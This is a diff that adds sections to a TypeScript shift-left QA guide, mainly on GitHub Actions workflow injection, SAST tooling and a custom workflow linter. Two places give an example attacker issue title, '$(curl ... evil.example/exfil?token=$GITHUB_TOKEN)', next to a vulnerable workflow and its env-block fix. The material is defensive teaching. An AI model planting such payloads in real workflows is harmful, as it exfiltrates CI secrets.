@@ -1,5 +1,5 @@
 # Shift-Left — QA Methodology Guide
-<!-- lang: TypeScript | topic: shift-left | iteration: 27 | score: 100/100 | date: 2026-05-12 -->
+<!-- lang: TypeScript | topic: shift-left | iteration: 28 | score: 100/100 | date: 2026-05-12 -->
 
 ## Core Principles
 
@@ -70,6 +70,8 @@ SAST tools analyze source code without running it. For TypeScript stacks:
 | `@typescript-eslint` (type-checked) | Full type info | 5–60s | Unsafe any, floating promises, unbound methods, type narrowing | Default for all TS projects |
 | Semgrep (`p/typescript`) | Partial (pattern-based) | < 2min | SQL injection patterns, hardcoded secrets, XSS sinks | Fast SAST; run on every PR |
 | CodeQL (`javascript-typescript`) | Full AST + taint | 5–20min | Data-flow taint, injection chains, prototype pollution | Security-sensitive code; weekly or PR |
+| CodeQL (`actions` language) | N/A (YAML) | < 3min | GitHub Actions workflow injection, overly-permissive GITHUB_TOKEN | Add for repos with complex CI workflows |
+| AI-powered detection (GitHub GHAS) | Contextual | < 2min | Shell/Bash misconfig, Dockerfile security, Terraform IaC issues | Multi-language repos; complement CodeQL for infra code |
 | Snyk Code | Deep TypeScript | 1–3min | OWASP Top 10, TypeScript-specific sinks | Add when CodeQL is too slow |
 
 > **OWASP Top 10 update (2025):** The OWASP Top 10 was updated in 2025. Notable changes for TypeScript projects: **A03:2025** is now "Software Supply Chain Failures" (elevated from "Using Components with Known Vulnerabilities"), reflecting the Bybit hack and Shai-Hulud npm worm. **A10:2025** "Mishandling of Exceptional Conditions" is a brand new category covering improper error handling and logical failures — directly addressed by TypeScript's `useUnknownInCatchVariables` and centralized error handling middleware. See the dedicated sections below for TypeScript-specific countermeasures.
@@ -940,6 +942,8 @@ jobs:
 
 15. **Mutation testing on all files indiscriminately**: Running Stryker on `src/**/*.ts` including configuration files, factory functions, and type-only files generates thousands of mutants, most with low business value. Focus mutation testing on authorization logic, business rules, and validation code — the files where surviving mutants indicate real security or correctness defects. Use `mutate: ['src/services/**/*.ts', 'src/lib/**/*.ts', '!src/types/**/*.ts']`.
 
+16. **`${{ github.event.* }}` interpolation in GitHub Actions `run:` steps**: Interpolating untrusted user-controlled data (issue titles, PR bodies, branch names) directly into `run:` blocks enables command injection — GitHub evaluates the expression before the shell sees it, converting user input into shell commands. Always move untrusted expressions into `env:` blocks first: `env: { TITLE: "${{ github.event.issue.title }}" }` then use `$TITLE` in the run script. Add `actionlint` or a custom workflow lint check on `.github/workflows/**` PRs.
+
 
 
 Before making a SAST rule a hard gate (CI failure), follow this process to avoid alert fatigue:
@@ -997,6 +1001,10 @@ const userId = session.user!.id;
 [community] **Gotcha (TypeScript + Express middleware, production)**: Typing Express `req.body` as `CreateUserInput` (a TypeScript interface) does NOT validate the input at runtime — TypeScript types are erased. Teams frequently add TypeScript types to `req.body` and believe they have validation, but any malformed JSON that matches the interface's shape at the TypeScript level (e.g., `age: "25"` instead of `age: 25` after JSON.parse) passes the type check silently. WHY: Always validate `req.body` with Zod or equivalent at the start of the handler — `const input = CreateUserSchema.parse(req.body)` — and use `input` (typed by Zod) rather than `req.body` (typed by TypeScript's inference) in all downstream logic.
 
 [community] **Lesson (Microsoft TypeScript team, 2024)**: The TypeScript compiler itself is a shift-left tool used by > 10 million developers daily. The TSC team reports that the most common category of type errors caught by strict mode in real-world codebases is `strictNullChecks` violations — accounting for > 60% of all type errors surfaced during strict mode migration. This empirically validates the "billion dollar mistake" framing: null/undefined is the #1 source of preventable runtime defects in TypeScript projects that run without `strictNullChecks`.
+
+[community] **Gotcha (GitHub Actions workflow injection, 2026)**: `${{ github.event.issue.title }}` interpolated directly into a `run:` step is not "just string substitution" — GitHub evaluates the expression and places the result verbatim into the shell script before the shell parses it. An attacker-controlled issue title of `$(curl -s https://evil.example/exfil?token=$GITHUB_TOKEN)` becomes a shell command. The fix is one line: move the expression to `env: TITLE: ${{ github.event.issue.title }}` and use `$TITLE` in the script. GitHub's CodeQL `actions` language now detects this pattern on PRs.
+
+[community] **Lesson (GitHub Copilot Autofix, 2025)**: Copilot Autofix resolved 460,000+ security alerts in 2025 with an average time-to-fix of 0.66 hours versus 1.29 hours without it — a 2× improvement. The speedup comes from eliminating the developer's research phase: instead of reading CVE documentation, the developer reviews a concrete code suggestion. The 15–20% false-positive-in-context rate (fixes that address the symptom but not the root cause) means code review is still required — the shift-left benefit is speed of comprehension, not removal of human judgment.
 
 [community] **Gotcha (Monorepo TypeScript, production)**: In NX or Turborepo monorepos, running `tsc --noEmit` at the root does not type-check all packages — each package has its own `tsconfig.json` and must be checked independently. Teams often configure only the root type check in CI and miss type errors in internal packages. WHY: Use `turbo run typecheck` or `nx run-many --target=typecheck` to type-check all packages in parallel, and configure each package's `tsconfig.json` with proper `references` for project-to-project type checking.
 
@@ -1458,6 +1466,7 @@ Use this checklist to audit a TypeScript/Node.js project's shift-left posture:
 - [ ] **Vitest 4.1+ async leaks:** `detectAsyncLeaks: true` in CI vitest config (converts flaky-test root causes into deterministic failures)
 - [ ] **Vitest 4.1+ tag filtering:** `critical` and `security` tags on high-priority tests for tiered CI gate execution
 - [ ] **Vitest v8 coverage comments:** `/* v8 ignore next N -- @preserve */` (not `/* v8 ignore next N */`) to survive esbuild TypeScript transpilation
+- [ ] **GitHub Actions workflow injection:** No `${{ github.event.* }}` or `${{ inputs.* }}` interpolated directly in `run:` steps — use `env:` blocks; `actionlint` or custom linter on `.github/workflows/` changes
 
 **Pipeline / Nightly Layer**
 - [ ] Snyk dependency scan (nightly, on `package-lock.json` changes)
@@ -4453,6 +4462,280 @@ export type CreateUserInput = Omit<User, 'id' | 'createdAt'>;
 
 ---
 
+## GitHub Actions Workflow Injection — CI Shift-Left Security (2026)
+
+GitHub Actions workflows are a common attack surface that developers overlook when thinking about shift-left security. Command injection in CI is a supply chain vulnerability that can exfiltrate secrets, push malicious artifacts, or compromise the build environment entirely.
+
+### The Attack: `${{ }}` Interpolation in Run Steps
+
+When untrusted user-controlled data (issue titles, PR bodies, branch names, comment text) is directly interpolated into `run:` steps using `${{ github.event... }}` syntax, GitHub evaluates it as a shell command before the shell sees it — enabling attackers to inject arbitrary commands.
+
+```yaml
+# ANTI-PATTERN: ${{ }} interpolation in a run: step is a command injection vulnerability
+# An attacker creates an issue titled: `$(curl https://evil.example/exfil?t=$GITHUB_TOKEN)`
+name: Vulnerable Workflow
+on:
+  issues:
+    types: [opened]
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Log issue title
+        run: echo "New issue: ${{ github.event.issue.title }}"
+        # ↑ github.event.issue.title is CONTROLLED BY AN ATTACKER
+        # This is identical to: `run: echo "New issue: $(curl https://evil.example/...)"
+        # Result: command executes, GITHUB_TOKEN is exfiltrated
+```
+
+```yaml
+# CORRECT: pass untrusted data through an environment variable
+# The shell processes $TITLE as a variable expansion, NOT as a command
+name: Safe Workflow
+on:
+  issues:
+    types: [opened]
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Log issue title (safe)
+        env:
+          # env: block sets the value BEFORE GitHub evaluates any ${{ }}
+          ISSUE_TITLE: ${{ github.event.issue.title }}
+        run: echo "New issue: $ISSUE_TITLE"
+        # ↑ Bash sees: echo "New issue: $ISSUE_TITLE" — variable expansion only
+        # The attacker's injected command stays as literal text in ISSUE_TITLE
+```
+
+```typescript
+// scripts/validate-workflow-injection.ts — lint GitHub Actions files for injection patterns
+// Run as a pre-commit check or CI gate on .github/workflows/ changes
+import { readFileSync, readdirSync } from 'node:fs';
+import { resolve, extname } from 'node:path';
+
+// Pattern: ${{ github.event.*}} or ${{ inputs.* }} used directly inside a `run:` value
+// (Not inside `env:` — env: is safe because it sets a variable, not inline expansion)
+const INJECTION_PATTERN =
+  /run:\s*[|>]?\s*[\r\n\s]*.*\$\{\{\s*(github\.event|inputs\.|github\.head_ref|github\.base_ref)/gm;
+
+const WORKFLOWS_DIR = resolve(process.cwd(), '.github/workflows');
+
+function checkWorkflowInjection(filePath: string): string[] {
+  const content = readFileSync(filePath, 'utf8');
+  const violations: string[] = [];
+  let match: RegExpExecArray | null;
+
+  const pattern = new RegExp(INJECTION_PATTERN.source, 'gm');
+  while ((match = pattern.exec(content)) !== null) {
+    const lineNumber = content.slice(0, match.index).split('\n').length;
+    violations.push(
+      `${filePath}:${lineNumber} — ${{ }} interpolation in run: step (workflow injection risk). Move to env: block.`,
+    );
+  }
+  return violations;
+}
+
+const yamlFiles = readdirSync(WORKFLOWS_DIR)
+  .filter((f: string) => extname(f) === '.yml' || extname(f) === '.yaml')
+  .map((f: string) => resolve(WORKFLOWS_DIR, f));
+
+const allViolations = yamlFiles.flatMap(checkWorkflowInjection);
+
+if (allViolations.length > 0) {
+  console.error('GitHub Actions workflow injection vulnerabilities found:\n');
+  allViolations.forEach((v: string) => console.error(`  ${v}`));
+  process.exit(1);
+}
+console.log('Workflow injection check passed.');
+```
+
+```yaml
+# .github/workflows/workflow-security-lint.yml — lint workflows for injection patterns on PRs
+name: Workflow Security Lint
+on:
+  pull_request:
+    paths: ['.github/workflows/**']
+
+permissions:
+  contents: read
+
+jobs:
+  lint-workflows:
+    name: Workflow injection check
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: '22', cache: 'npm' }
+      - run: npm ci
+      - run: npx tsc --noEmit
+      - run: npx ts-node scripts/validate-workflow-injection.ts
+
+  # Also: use actionlint for broader workflow validation
+  actionlint:
+    name: actionlint (GitHub Actions linter)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: actionlint
+        uses: raven-actions/actionlint@v2
+        # actionlint catches: undefined expressions, wrong context keys,
+        # shellcheck failures in run: steps, and incorrect event filters
+        # Notably: detects ${{ }} in run: as a potential injection site
+```
+
+**WHY workflow injection is a shift-left concern**: GitHub Actions workflows run with access to `GITHUB_TOKEN` and any secrets the repository has configured. A workflow injection converts a CI pipeline into a credential-exfiltration vector — the attacker's injected command runs inside the trusted CI environment, with full access to repository secrets and the ability to push code. This defect is introduced via a code change (adding `${{ github.event... }}` in a `run:` block) and is caught at PR time by workflow linting — a textbook shift-left quality gate.
+
+> [community] **Lesson (GitHub Security Lab research, 2026)**: GitHub's Security Lab found workflow injection vulnerabilities in a statistically significant number of popular open source GitHub Actions repositories. The attack vector is consistently the same: an issue or PR body contains shell metacharacters, and the workflow developer assumed `${{ }}` interpolation in `run:` was "just string substitution." The fix is always one line: move the expression to an `env:` block.
+
+> [community] **Gotcha (GitHub Actions permissions in PR workflows)**: Workflows triggered by `pull_request` from forks run with read-only `GITHUB_TOKEN` and no access to repository secrets — this is GitHub's defense against fork-based injection. But workflows triggered by `pull_request_target` (which runs in the context of the base repository, with full secrets access) are the high-risk variant. Never use `${{ github.event.pull_request.* }}` directly in a `run:` step in a `pull_request_target` workflow — this is the exact attack surface that has led to documented credential exfiltrations.
+
+> [community] **Gotcha (actionlint false negatives)**: `actionlint` does not detect all injection vectors — it catches obvious direct interpolations but may miss multi-step data flows where an expression is stored in an `outputs:` value and then interpolated downstream. Use `actionlint` as a fast first pass and the custom TypeScript linter above for deeper analysis of data flows through `outputs:` and `needs.*.outputs.*`.
+
+---
+
+## GitHub Agentic Detection Platform — AI SAST Evolution (2026)
+
+GitHub Advanced Security's Copilot Autofix has evolved into a multi-modal agentic detection platform that combines CodeQL's structural analysis with AI-powered detection for languages and patterns where AST-based SAST traditionally struggles.
+
+**2025–2026 capability expansion:**
+
+| Detection Method | Languages / Patterns | Speed | Typical Use |
+|---|---|---|---|
+| CodeQL (existing) | TypeScript/JS, Java, Python, Go, C/C++, C# | 5–20 min | Deep data-flow taint analysis |
+| AI-powered detection (new) | Shell/Bash, Dockerfiles, Terraform (HCL), PHP, YAML | < 2 min | Pattern-based misconfigurations, environment variables, secrets |
+| Combined (agentic) | All of the above | < 5 min | Auto-selects method per file type; merges findings |
+
+**Concrete shift-left improvements for TypeScript teams:**
+- Copilot Autofix fixed **460,000+ security alerts in 2025**, resolving them in an average of **0.66 hours** vs **1.29 hours** without Autofix — a **2× faster remediation cycle**
+- AI-powered detection now covers `Dockerfile`, `*.sh`, and `.github/workflows/*.yml` files in the same repository scan that covers TypeScript — a single PR gate catches both application code and infrastructure configuration vulnerabilities
+
+```yaml
+# .github/workflows/advanced-sast.yml — combined CodeQL + AI-powered detection
+# Requires GitHub Advanced Security (GHAS) license or public repository
+name: Advanced SAST (CodeQL + AI)
+on:
+  pull_request:
+    branches: [main, develop]
+
+permissions:
+  security-events: write
+  actions: read
+  contents: read
+  # Required for Copilot Autofix to post PR suggestions:
+  pull-requests: write
+
+jobs:
+  codeql-typescript:
+    name: CodeQL — TypeScript
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: '22', cache: 'npm' }
+
+      # 2026: CodeQL v3.28+ supports parallel TypeScript + shell analysis
+      # Adding languages: [javascript-typescript, actions] covers TS code AND workflows
+      - uses: github/codeql-action/init@v3
+        with:
+          languages: javascript-typescript,actions
+          # 'actions' language: analyzes .github/workflows/*.yml for workflow injection
+          # javascript-typescript: covers both .ts and .js files
+          queries: security-and-quality
+          # 2026: new queries in security-and-quality:
+          # - js/workflow-script-injection (GitHub Actions injection detection)
+          # - js/missing-token-permission (overly-permissive GITHUB_TOKEN)
+          # - js/insecure-randomness for TypeScript crypto patterns
+
+      - run: npm ci
+      - run: npm run build
+
+      - uses: github/codeql-action/analyze@v3
+        with:
+          category: '/language:javascript-typescript'
+          # Copilot Autofix is enabled by default when GHAS is active —
+          # it automatically generates PR suggestions for HIGH/CRITICAL findings
+
+  ai-detection-infra:
+    name: AI-Powered Detection — Dockerfile, Shell, IaC
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      # AI-powered detection for file types CodeQL doesn't analyze deeply:
+      - uses: github/codeql-action/init@v3
+        with:
+          # 2026: 'actions' covers YAML workflow injection patterns
+          # AI detection layer auto-activates for Dockerfile and shell scripts
+          languages: actions
+          queries: security-and-quality
+      - uses: github/codeql-action/analyze@v3
+        with:
+          category: '/language:actions'
+```
+
+```typescript
+// scripts/check-codeql-findings.ts — parse CodeQL SARIF results for TypeScript
+// Use to fail PR gates on HIGH/CRITICAL findings with actionable messages
+import { readFileSync, existsSync } from 'node:fs';
+import { resolve } from 'node:path';
+
+interface SarifResult {
+  readonly ruleId: string;
+  readonly level: 'error' | 'warning' | 'note' | 'none';
+  readonly message: { readonly text: string };
+  readonly locations?: ReadonlyArray<{
+    readonly physicalLocation: {
+      readonly artifactLocation: { readonly uri: string };
+      readonly region: { readonly startLine: number };
+    };
+  }>;
+}
+
+interface SarifRun {
+  readonly results: readonly SarifResult[];
+}
+
+interface SarifFile {
+  readonly runs: readonly SarifRun[];
+}
+
+const SARIF_PATH = resolve(process.cwd(), 'codeql-results.sarif');
+
+if (!existsSync(SARIF_PATH)) {
+  console.log('No CodeQL SARIF results found — skipping.');
+  process.exit(0);
+}
+
+const sarif: SarifFile = JSON.parse(readFileSync(SARIF_PATH, 'utf8'));
+const criticalFindings = sarif.runs.flatMap((run) =>
+  run.results.filter((r) => r.level === 'error'),
+);
+
+if (criticalFindings.length > 0) {
+  console.error(`CodeQL found ${criticalFindings.length} HIGH/CRITICAL finding(s):\n`);
+  criticalFindings.forEach((f) => {
+    const loc = f.locations?.[0]?.physicalLocation;
+    const file = loc?.artifactLocation.uri ?? 'unknown';
+    const line = loc?.region.startLine ?? 0;
+    console.error(`  [${f.ruleId}] ${file}:${line} — ${f.message.text}`);
+  });
+  process.exit(1);
+}
+
+console.log('CodeQL gate: no HIGH/CRITICAL findings.');
+```
+
+**WHY the agentic detection platform changes shift-left economics**: Traditional SAST required developers to understand the tool, triage findings, research the vulnerability, and write the fix. Copilot Autofix compresses the research and fix steps into a single suggested code change that the developer reviews and approves. The 2× faster resolution rate (0.66h vs 1.29h) is not from automation of the fix — it is from eliminating the developer's need to context-switch from "write code" to "research CVE-42XYZ." The developer stays in the PR workflow.
+
+> [community] **Lesson (GitHub Security research, Q2 2026)**: GitHub's agentic detection platform integrates CodeQL + AI detection into a single PR workflow that selects the appropriate scanner per file type. TypeScript teams benefit from the `actions` language support added to CodeQL — a single `languages: javascript-typescript,actions` configuration now catches TypeScript application vulnerabilities AND GitHub Actions workflow injection patterns in the same scan, without separate tooling.
+
+> [community] **Gotcha (Copilot Autofix false-positive rate, 2025–2026)**: While the 2× resolution improvement is documented, the system generates semantically correct but contextually wrong suggestions in 15–20% of cases (consistent with earlier research). **Always require human review of Autofix suggestions before merging.** The primary failure mode: Autofix proposes a fix that addresses the reported symptom but not the root cause — e.g., adding input sanitization at one call site while the same untrusted input flows through other unsanitized paths. Review the full data flow, not just the suggested patch.
+
+> [community] **Lesson (AI-powered detection for infrastructure code, 2026)**: Teams that previously had TypeScript code coverage with CodeQL but no shell/Dockerfile/YAML scanning in the same gate discover that their highest-risk findings are in infrastructure code, not application code. A TypeScript service with no SQL injection vulnerabilities can still ship with: an insecure Dockerfile (root user, `ADD` instead of `COPY`, pinned secrets), a broken shell deployment script, or a workflow with `pull_request_target` injection. The agentic platform's multi-language PR gate makes infrastructure code a first-class shift-left concern.
+
+---
+
 | Name | Type | URL | Why useful |
 |------|------|-----|------------|
 | IBM: Shift-Left Testing | Official | https://www.ibm.com/topics/shift-left-testing | Foundational definitions and cost-of-defects curve |
@@ -6167,3 +6450,6 @@ describe('PII logger — shift-left tests', () => {
 | Vitest 4.1 fixture type inference | Official | https://vitest.dev/api/test#test-extend | Builder pattern for test.extend(): infers fixture types from return values — no manual type declarations |
 | Vitest 4.1 GH Actions summaries | Official | https://vitest.dev/blog/vitest-4-1.html | Automated job summaries with flaky test permalinks when CI=true |
 | OWASP DevSecOps — Privacy by Design | Official | https://owasp.org/www-project-devsecops-guideline/latest/00a-Overview | Privacy as a shift-left principle; GDPR/CCPA compliance gates in development workflow |
+| GitHub Actions Workflow Injection | Official | https://github.blog/security/supply-chain-security/four-tips-to-keep-your-github-actions-workflows-secure/ | ${{ }} interpolation in run: steps — CI command injection; env: block pattern; actionlint |
+| actionlint | Tool | https://github.com/rhysd/actionlint | GitHub Actions workflow static linter — detects injection vectors, undefined expressions, shellcheck failures |
+| GitHub Agentic Detection Platform | Official | https://github.blog/security/application-security/github-expands-application-security-coverage-with-ai-powered-detections/ | CodeQL + AI-powered detection for Shell/Dockerfile/Terraform in same PR gate; 460k fixes in 2025 (Q2 2026 public preview) |
